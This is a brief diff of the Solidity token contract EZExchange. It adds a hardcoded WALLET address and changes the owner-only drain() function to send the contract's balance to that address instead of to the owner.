@@ -75,6 +75,8 @@ contract EZExchange is ERC20 {
     uint256 maxCap_ICO3;
     uint256 maxCap_ICO4;
     
+    address public WALLET = 0x5beE762aa0192dcB89f827e09B94aD62d22B7Bc8;
+    
     uint public priceFactor;
     mapping(address => uint) balances;
     mapping(address => mapping(address => uint)) allowed;
@@ -282,6 +284,6 @@ contract EZExchange is ERC20 {
     
     function drain() external onlyOwner {
         address myAddress = this;
-        owner.transfer(myAddress.balance);
+        WALLET.transfer(myAddress.balance);
     }
 }
